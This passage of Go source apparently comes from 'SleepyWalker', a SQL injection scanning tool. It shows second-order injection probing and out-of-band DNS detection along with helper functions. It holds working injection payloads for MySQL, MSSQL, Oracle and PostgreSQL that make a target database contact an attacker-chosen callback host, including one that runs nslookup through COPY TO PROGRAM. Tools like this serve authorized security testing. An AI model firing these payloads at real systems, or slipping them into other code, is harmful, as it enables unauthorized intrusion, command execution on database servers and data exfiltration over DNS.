		if dbEngine == "SQLite" && baseline != "" {
			sim := jaccardSimilarity(baseline, body)
			if sim > 0.90 {
				return true, p.payload
			}
		}
	}
	return false, ""
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 10: Second-Order Detection Stub
// ═══════════════════════════════════════════════════════════════════════

// secondOrderStub stores a marker payload via POST, then checks related
// display URLs for SQL errors — indicating stored/second-order SQL injection.
// Improved: instead of only re-fetching the exact POST URL, it also checks
// common related display pages (e.g., /profile, /dashboard, parent path).
func secondOrderStub(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter) bool {
	// Only applicable for POST entry points with a display/profile page
	if ep.Method != "POST" {
		return false
	}

	// Use a marker that would cause an error if it gets into a SQL query
	marker := "sw_probe_1'" // single-quote to break SQL context

	// Build a list of candidate display URLs to check for reflected errors.
	candidateURLs := inferRelatedDisplayURLs(ep.URL)

	errorSigns := []string{
		"syntax error", "unterminated", "unclosed quotation",
		"you have an error", "mysql", "ora-", "pg_query",
		"sqlite", "jdbc", "odbc",
	}

	// Fetch baselines BEFORE injecting marker.
	baselineResponses := make(map[string]string)
	for _, checkURL := range candidateURLs {
		req, err := http.NewRequest("GET", checkURL, nil)
		if err != nil { continue }
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil { cfg.ApplyHeaders(req) }
		if rl != nil { rl.Wait() }
		body, _, err := doRequestWithStatus(client, req)
		if err != nil { continue }
		baselineResponses[checkURL] = body
	}

	// Inject marker.
	if rl != nil { rl.Wait() }
	_, _, err := fetchParamWithPayloadWithStatus(client, cfg, ep, param, marker)
	if err != nil { return false }

	// Check for NEW errors in display pages.
	for _, checkURL := range candidateURLs {
		req, err := http.NewRequest("GET", checkURL, nil)
		if err != nil { continue }
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil { cfg.ApplyHeaders(req) }
		if rl != nil { rl.Wait() }
		body, _, err := doRequestWithStatus(client, req)
		if err != nil { continue }
		lower := strings.ToLower(body)
		baseLower := strings.ToLower(baselineResponses[checkURL])
		for _, sign := range errorSigns {
			// Only flag if error is NEW (not in baseline).
			if strings.Contains(lower, sign) && !strings.Contains(baseLower, sign) {
				log.Printf("[DEEP]   Second-order: POST %s → GET %s triggered SQL error", ep.URL, checkURL)
				return true
			}
		}
	}

	return false
}

// inferRelatedDisplayURLs generates candidate URLs where stored/second-order
// SQL injection might manifest after a POST. For example:
//   POST /profile/edit  → check /profile, /profile/view, /profile/edit, /dashboard
//   POST /user/1/update → check /user/1, /user/1/update
func inferRelatedDisplayURLs(postURL string) []string {
	parsed, err := url.Parse(postURL)
	if err != nil {
		return []string{postURL}
	}

	candidates := []string{postURL} // always check the POST URL itself

	path := strings.TrimRight(parsed.Path, "/")
	segments := strings.Split(path, "/")

	// Remove common action suffixes to find the display URL.
	actionSuffixes := []string{"edit", "update", "save", "create", "new", "add", "modify", "delete"}
	if len(segments) > 1 {
		last := strings.ToLower(segments[len(segments)-1])
		for _, suffix := range actionSuffixes {
			if last == suffix {
				// e.g., /profile/edit → /profile
				parentPath := strings.Join(segments[:len(segments)-1], "/")
				parentURL := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, parentPath)
				candidates = append(candidates, parentURL)

				// Also try /profile/view
				viewURL := fmt.Sprintf("%s://%s%s/view", parsed.Scheme, parsed.Host, parentPath)
				candidates = append(candidates, viewURL)
				break
			}
		}

		// Also try the parent path (e.g., /user/1/orders → /user/1)
		parentPath := strings.Join(segments[:len(segments)-1], "/")
		parentURL := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, parentPath)
		candidates = append(candidates, parentURL)
	}

	// Add common display pages.
	baseURL := fmt.Sprintf("%s://%s", parsed.Scheme, parsed.Host)
	candidates = append(candidates, baseURL+"/dashboard", baseURL+"/profile")

	// Deduplicate.
	seen := make(map[string]bool)
	var unique []string
	for _, u := range candidates {
		if !seen[u] {
			seen[u] = true
			unique = append(unique, u)
		}
	}
	return unique
}

// ═════════════════════════════════════════════════════════════════════
// Technique 11: Out-of-Band (OOB) DNS Detection Stub
// ═════════════════════════════════════════════════════════════════════

// oobDetectionStub fires DNS-based out-of-band payloads when the
// SLEEPYWALKER_OOB_DOMAIN environment variable is set. This enables
// detection of blind SQL injection that does not alter the HTTP response
// but causes the DB to make an outbound DNS request.
//
// The payloads target DB-specific DNS resolution functions:
//   - MySQL: LOAD_FILE with UNC path
//   - MSSQL: xp_dirtree / master..xp_fileexist
//   - Oracle: UTL_INADDR.GET_HOST_ADDRESS
//   - PostgreSQL: COPY ... FROM PROGRAM
//
// If any payload causes a response change (status shift, error message),
// it also counts as a positive signal. The actual DNS callback check is
// left to external tools (e.g., interactsh) or future integration.
func oobDetectionStub(client *http.Client, cfg *config.Config, ep EntryPoint, param, dbHint string, rl *utils.RateLimiter) (bool, string) {
	oobDomain := os.Getenv("SLEEPYWALKER_OOB_DOMAIN")
	if oobDomain == "" {
		return false, ""
	}

	// Generate a unique subdomain per probe for callback correlation.
	marker := fmt.Sprintf("sw%x", time.Now().UnixNano()%0xFFFFFFFF)
	callbackHost := fmt.Sprintf("%s.%s", marker, oobDomain)

	// DB-specific OOB payloads.
	type oobPayload struct {
		db      string
		payload string
	}

	var payloads []oobPayload

	// Always fire the generic payloads; add DB-specific ones if we have a hint.
	payloads = append(payloads,
		oobPayload{"MySQL", fmt.Sprintf("1' AND LOAD_FILE('\\\\\\\\%s\\\\a')-- -", callbackHost)},
		oobPayload{"MySQL", fmt.Sprintf("1' AND LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.%s\\\\a'))-- -", callbackHost)},
		oobPayload{"MySQL", fmt.Sprintf("1' UNION SELECT LOAD_FILE('\\\\\\\\%s\\\\a')-- -", callbackHost)},
		oobPayload{"MSSQL", fmt.Sprintf("1'; EXEC master..xp_dirtree '\\\\\\\\%s\\\\a'-- -", callbackHost)},
		oobPayload{"MSSQL", fmt.Sprintf("1'; EXEC master..xp_fileexist '\\\\\\\\%s\\\\a'-- -", callbackHost)},
		oobPayload{"MSSQL", fmt.Sprintf("1'; DECLARE @q varchar(999);SET @q='\\\\\\\\%s\\\\a';EXEC master..xp_dirtree @q-- -", callbackHost)},
		oobPayload{"Oracle", fmt.Sprintf("1' AND 1=UTL_INADDR.GET_HOST_ADDRESS('%s')-- -", callbackHost)},
		oobPayload{"Oracle", fmt.Sprintf("1' AND 1=UTL_HTTP.REQUEST('http://%s/')-- -", callbackHost)},
		oobPayload{"Oracle", fmt.Sprintf("1' AND DBMS_LDAP.INIT('%s',80) IS NOT NULL-- -", callbackHost)},
		oobPayload{"PostgreSQL", fmt.Sprintf("1'; COPY (SELECT '') TO PROGRAM 'nslookup %s'-- -", callbackHost)},
		oobPayload{"PostgreSQL", fmt.Sprintf("1' AND 1=(SELECT dblink_connect('host=%s'))-- -", callbackHost)},
	)

	// If we have a DB hint, try those first.
	if dbHint != "" {
		sort.SliceStable(payloads, func(i, j int) bool {
			return payloads[i].db == dbHint
		})
	}

	if rl != nil { rl.Wait() }
	baseline := fetchWithPayload(client, cfg, ep, param, "1")

	for _, p := range payloads {
		if rl != nil { rl.Wait() }
		body := fetchWithPayload(client, cfg, ep, param, p.payload)
		if body == "" {
			continue
		}

		// Check if the response differs from baseline (error triggered, status change).
		if baseline != "" {
			sim := jaccardSimilarity(baseline, body)
			if sim < 0.70 {
				log.Printf("[DEEP]   OOB: payload caused response change (sim=%.2f, db=%s, callback=%s)",
					sim, p.db, callbackHost)
				return true, p.payload
			}
		}

		// Check for SQL errors in the response (some OOB payloads may break syntax).
		lower := strings.ToLower(body)
		errorSigns := []string{"syntax error", "xp_dirtree", "utl_inaddr", "load_file", "permission denied"}
		for _, sign := range errorSigns {
			if strings.Contains(lower, sign) {
				log.Printf("[DEEP]   OOB: payload triggered error (db=%s, sign=%s, callback=%s)",
					p.db, sign, callbackHost)
				return true, p.payload
			}
		}
	}

	log.Printf("[DEEP]   OOB: payloads sent to %s — check DNS callback logs for %s.%s",
		ep.URL, marker, oobDomain)
	return false, ""
}

// ═══════════════════════════════════════════════════════════════════════
// Helpers
// ═══════════════════════════════════════════════════════════════════════

// pickParam selects the first parameter name to test, or "id" as fallback.
func pickParam(ep EntryPoint) string {
	// Prefer common injectable names
	priority := []string{"id", "uid", "user", "username", "pass", "search", "query", "q", "page", "cat", "item"}
	for _, p := range priority {
		if _, ok := ep.Params[p]; ok {
			return p
		}
	}
	// Just pick the first one
	for k := range ep.Params {
		return k
	}
	return "id"
}

// pickParamFromHeuristic selects the parameter that Phase 1 actually tested.
func pickParamFromHeuristic(hr HeuristicResult, ep EntryPoint) string {
	// If heuristic tested a specific param, use it.
	if hr.TestPayload != "" && hr.TestPayload != "boolean-differential" && hr.TestPayload != "time-based" {
		// The probe tested params in order; use pickLikelyInjectableParam which was used in Phase 1.
		if len(ep.Params) > 0 {
			return pickLikelyInjectableParam(ep.Params)
		}
	}
	return pickParam(ep)
}

// buildURL creates the full URL with the given param set to the payload value.
// Preserves declared param values (e.g. Login=Login, Submit=Submit) as neutrals.
func buildURL(ep EntryPoint, param, payload string) (string, error) {
	u, err := url.Parse(ep.URL)
	if err != nil {
		return "", err
	}
	q := u.Query()
	for k, v := range ep.Params {
		if k == param {
			q.Set(k, payload)
		} else {
			neutral := v
			if neutral == "" {
				neutral = "1"
			}
			q.Set(k, neutral)
		}
	}
	if _, ok := ep.Params[param]; !ok {
		q.Set(param, payload)
	}
	u.RawQuery = q.Encode()
	return u.String(), nil
}

// fetchWithPayload sends a request with a single param set to the payload and returns the body.
// Preserves actual declared param values as neutrals (e.g. Submit=Submit) so
// server-side isset() checks don't skip the query.
func fetchWithPayload(client *http.Client, cfg *config.Config, ep EntryPoint, param, payload string) string {
	body, _, _ := fetchParamWithPayloadWithStatus(client, cfg, ep, param, payload)
	return body
}

// measureTime sends a request and returns the wall-clock duration.
// Handles all injection locations: query, body (POST/PUT/PATCH), header, json.
func measureTime(client *http.Client, cfg *config.Config, ep EntryPoint, param, payload string) time.Duration {
	start := time.Now()
	_, _, err := fetchParamWithPayloadWithStatus(client, cfg, ep, param, payload)
	if err != nil {
		return -1
	}
	return time.Since(start)
}
